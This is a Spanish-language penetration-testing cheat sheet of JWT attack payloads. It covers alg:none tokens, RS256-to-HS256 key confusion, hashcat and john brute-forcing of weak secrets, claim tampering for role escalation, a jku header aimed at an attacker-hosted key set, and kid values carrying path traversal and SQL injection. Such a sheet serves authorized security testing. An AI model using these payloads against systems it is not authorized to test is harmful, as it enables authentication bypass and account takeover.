# JWT Payloads

> Ver `skills/hunt/jwt`. Evidencia: el servidor ACEPTA el token manipulado y
> actúa según el claim alterado.

## Decodificación y análisis

```bash
echo 'eyJ...' | cut -d. -f2 | base64 -d 2>/dev/null
# o jwt.io / jwt_tool: python3 jwt_tool.py {TOKEN}
```

## Algorithm confusion / none

```
-- alg:none (header):  {"alg":"none","typ":"JWT"}
   payload sin firma: base64(header).base64(payload).   (firma vacía)
-- Variantes: "None", "NONE", "nOnE" (parsers case-sensitive débiles)
-- RS256→HS256 confusion: firmar el payload con la CLAVE PÚBLICA como secreto
   HMAC (la clave pública suele ser obtenible: /.well-known/jwks.json, cert TLS):
   python3 jwt_tool.py {TOKEN} -X a -pc pubkey.pem
```

## Weak secret brute-force

```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt       -- modo 16500 = JWT
john jwt.txt --wordlist=wordlist.txt
python3 jwt_tool.py {TOKEN} -C -d wordlist.txt
-- Secretos comunes: secret, password, key, {appname}, {appname}123, changeme
```

## Claim tampering (firma no verificada o tras crack del secreto)

```
-- Claims a mutar:
{"sub": "1"} → {"sub": "2"}                    -- horizontal
{"role": "user"} → {"role": "admin"}           -- vertical
{"exp": ...} → futuro lejano                   -- token eterno
{"aud": "internal-api"} → otro servicio        -- confused deputy
{"jku": "https://{attacker}/jwks.json"}        -- si el servidor sigue jku
{"kid": "../../dev/null"}  /  {"kid": "/path/to/file"}  -- path traversal en kid
{"kid": "x' UNION SELECT 'secret'--"}          -- SQLi vía kid lookup
```

## jku/x5u injection

```
-- Si el servidor obtiene la clave del header jku/x5u:
   1. Generar par propio, hospedar jwks.json en infra propia
   2. Firmar token con la clave propia, apuntar jku a ella
   3. Callback en el fetch del JWKS = el servidor lo consultó (OAST aplica)
```

## Pruebas estructurales

```
-- ¿El servidor valida firma? Modificar 1 char del payload (sin re-firmar):
   si responde 200 actuando sobre el claim → firma NO verificada (crítico)
-- ¿Valida exp/nbf? Reusar token expirado.
-- ¿Valida aud/iss? Token de otro servicio del mismo ecosistema.
-- ¿Revocación? Usar token post-logout / post-cambio-password.
```

## Gotchas de uso

- Token aceptado con claim modificado = finding. Token decodificable (sin
  más) NO es finding — JWT es base64, no cifrado; "puedo leer el payload"
  es esperado.
- alg:none rechazado por librerías modernas — si falla, es N/A, no "bypass
  parcial".
- Documentar qué librería/versión valida (del fingerprint) — varios bugs de
  JWT son específicos de librería.
